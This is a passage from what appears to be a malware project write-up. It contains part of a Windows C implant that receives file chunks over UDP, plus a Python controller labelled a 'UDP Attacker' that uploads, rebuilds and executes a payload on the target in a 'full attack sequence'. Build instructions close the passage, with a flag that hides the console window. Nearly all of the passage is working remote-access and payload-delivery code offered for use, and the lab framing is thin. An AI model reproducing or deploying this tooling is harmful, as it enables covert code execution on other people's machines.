        char* data_ptr = strchr(index_str, ':');
        if (data_ptr) {
            *data_ptr = '\0';
            int index = atoi(index_str);
            data_ptr++;
            int data_len = len - (data_ptr - buffer);
            
            char key[32];
            snprintf(key, sizeof(key), "chunk_%03d", index);
            store_chunk(key, (BYTE*)data_ptr, data_len);
            
            sendto(sock, "[+] Chunk stored", 16, 0, (struct sockaddr*)client_addr, client_len);
        }
    }
    else if (strncmp(buffer, "ping", 4) == 0) {
        sendto(sock, "[+] Pong", 8, 0, (struct sockaddr*)client_addr, client_len);
    }
    else {
        sendto(sock, "[!] Unknown command", 19, 0, (struct sockaddr*)client_addr, client_len);
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[CHUNK_SIZE + 16];
    char* host_only_ip = get_host_only_ip();

    // We start Windows Socket Utility here
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        return 1;
    }

    // Socket created below
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Sockaddr_in structure made
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(host_only_ip);
    server.sin_port = htons(UDP_PORT);

    // Bind to host-only interface
    if (bind(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[*] Listening on %s:%d\n", host_only_ip, UDP_PORT);

    while (1) {
        struct sockaddr_in client;
        int client_len = sizeof(client);
        int len = recvfrom(sock, buffer, sizeof(buffer) - 1, 0, (struct sockaddr*)&client, &client_len);
        if (len > 0) {
            handle_command(sock, buffer, len, &client, client_len);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
```
And code for the controller is given below.
```py
import socket
import argparse
import os
import time
import struct

UDP_PORT = 5555
CHUNK_SIZE = 1024

def send_command(target_ip, command, port=UDP_PORT, expect_response=True):

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(command.encode(), (target_ip, port))
        print(f"[+] Sent command: {command}")
        
        if expect_response:
            try:
                sock.settimeout(3.0)
                response, _ = sock.recvfrom(1024)
                print(f"[Response] {response.decode()}")
                return True
            except socket.timeout:
                print("[!] No response received")
                return False
        return True

def send_file(target_ip, file_path, port=UDP_PORT):

    if not os.path.exists(file_path):
        print(f"[!] File not found: {file_path}")
        return False
    
    file_size = os.path.getsize(file_path)
    print(f"[*] Sending {file_path} ({file_size} bytes) to {target_ip}")
    
    with open(file_path, "rb") as f:
        chunk_index = 0
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
                
            # Format: chunk:<index>:<binary data>
            packet = f"chunk:{chunk_index}:".encode() + chunk
            
            success = False
            retries = 3
            while retries > 0 and not success:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(packet, (target_ip, port))
                    try:
                        sock.settimeout(1.0)
                        response, _ = sock.recvfrom(1024)
                        if b"Chunk stored" in response:
                            print(f"[+] Chunk {chunk_index} ACK: {response.decode()}")
                            success = True
                        else:
                            print(f"[!] Unexpected response: {response.decode()}")
                    except socket.timeout:
                        print(f"[!] Timeout on chunk {chunk_index}, retrying...")
                        retries -= 1
            
            if not success:
                print(f"[!] Failed to send chunk {chunk_index} after 3 attempts")
                return False
                
            chunk_index += 1
            time.sleep(0.01)  # Small delay to prevent packet loss

    print(f"[*] File transfer complete. Sent {chunk_index} chunks")
    return True

def execute_sequence(target_ip, file_path=None, port=UDP_PORT):
    """Full sequence: clear, upload, rebuild, and execute with verification"""
    print("[*] Starting full attack sequence")
    
    # 0. Test connectivity
    if not send_command(target_ip, "ping", port):
        print("[!] Target not responding to ping")
        return False
    
    # 1. Clear existing chunks
    if not send_command(target_ip, "clear", port):
        print("[!] Clear command failed")
        return False
    
    if file_path:
        # 2. Upload new file
        if not send_file(target_ip, file_path, port):
            return False
        
        # 3. Rebuild file
        if not send_command(target_ip, "rebuild", port):
            print("[!] Rebuild command failed")
            return False
        
        # 4. Execute file
        if not send_command(target_ip, "run", port):
            print("[!] Run command failed")
            return False
    
    print("[*] Attack sequence completed successfully")
    return True

def find_vbox_host_only_ip():
    """Attempt to discover VirtualBox host-only IP automatically"""
    # Common VirtualBox host-only subnets
    common_subnets = [
        "192.168.56.",  # Default VirtualBox host-only network
        "192.168.57.",
        "192.168.58.",
        "192.168.59."
    ]
    
    # Check local interfaces
    hostname = socket.gethostname()
    local_ips = socket.gethostbyname_ex(hostname)[2]
    
    for ip in local_ips:
        for subnet in common_subnets:
            if ip.startswith(subnet):
                return ip
    
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UDP Attacker for VirtualBox Malware")
    parser.add_argument("target", nargs="?", help="Target IP address (default: auto-discover)")
    parser.add_argument("-p", "--port", type=int, default=UDP_PORT, help="UDP port (default: 5555)")
    
    # Command options
    parser.add_argument("--cmd", help="Send a single command")
    parser.add_argument("--upload", help="Upload a file to target")
    parser.add_argument("--rebuild", action="store_true", help="Rebuild file from registry")
    parser.add_argument("--clear", action="store_true", help="Clear registry chunks")
    parser.add_argument("--run", action="store_true", help="Execute the rebuilt file")
    parser.add_argument("--auto", help="Full sequence: clear, upload, rebuild, execute")
    
    args = parser.parse_args()

    # Auto-discover target IP if not specified
    if not args.target:
        args.target = find_vbox_host_only_ip()
        if not args.target:
            print("[!] Could not auto-discover VirtualBox host-only IP")
            print("[!] Please specify target IP manually")
            exit(1)
        print(f"[*] Using auto-discovered target IP: {args.target}")

    if args.cmd:
        send_command(args.target, args.cmd, args.port)
    elif args.upload:
        send_file(args.target, args.upload, args.port)
    elif args.rebuild:
        send_command(args.target, "rebuild", args.port)
    elif args.clear:
        send_command(args.target, "clear", args.port)
    elif args.run:
        send_command(args.target, "run", args.port)
    elif args.auto:
        execute_sequence(args.target, args.auto, args.port)
    else:
        # Interactive mode
        print(f"[*] Interactive mode with target {args.target}:{args.port}")
        print("Commands: upload, rebuild, clear, run, ping, exit")
        
        while True:
            try:
                cmd = input("cmd> ").strip()
                if not cmd:
                    continue
                    
                if cmd == "exit":
                    break
                    
                if cmd.startswith("upload "):
                    _, file_path = cmd.split(" ", 1)
                    send_file(args.target, file_path, args.port)
                elif cmd == "rebuild":
                    send_command(args.target, "rebuild", args.port)
                elif cmd == "clear":
                    send_command(args.target, "clear", args.port)
                elif cmd == "run":
                    send_command(args.target, "run", args.port)
                elif cmd == "ping":
                    send_command(args.target, "ping", args.port)
                else:
                    print("Unknown command. Valid commands: upload, rebuild, clear, run, exit")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Error: {str(e)}")
```

**Setup**:

 1. Build the udp_rca.c file
 ```x86_64-w64-mingw32-gcc udp_rca.c -o output.exe -mwindows -lws2_32 -liphlpapi -lcrypt32 -lwininet```
 (Note: -mwindows forces GUI mode to prevent the console opening.)
 
 2. Move the built .exe to the host(vboxmachine for testing).
 3. Note: Make sure the port is open, and if using VBox, make sure to have the network set to Host-Only Adapter.
 4. Now launch the .exe file in the host.
 5. Run the ctrl.py script in the control machine, passing the IP of the host machine.
 `python3 ctrl.py 192.168.56.2`
 6. Now pass commands through the shell to upload, rebuild, erase, and ping the host machine for testing.
 7. The system is now ready to operate as per requirement.



 



